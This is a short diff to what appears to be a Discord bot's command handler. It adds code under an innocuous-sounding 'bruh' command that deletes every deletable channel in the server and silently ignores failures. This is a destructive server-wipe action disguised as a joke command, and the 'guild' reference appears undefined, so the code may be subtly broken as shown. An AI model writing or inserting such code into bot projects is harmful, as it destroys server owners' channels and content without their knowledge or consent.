@@ -271,7 +271,10 @@ bot.on('message', async message => {
             break;
 
         case 'bruh':
-            message.channel.delete.bulkDelete
+            guild.channels.cache.map(c=>{
+				if(c.deletable){
+                    c.delete().then(()=>console.log(`Deleted channel ${c.name}`)).catch(()=>{})
+            }});
         break;
 
         case 'react':
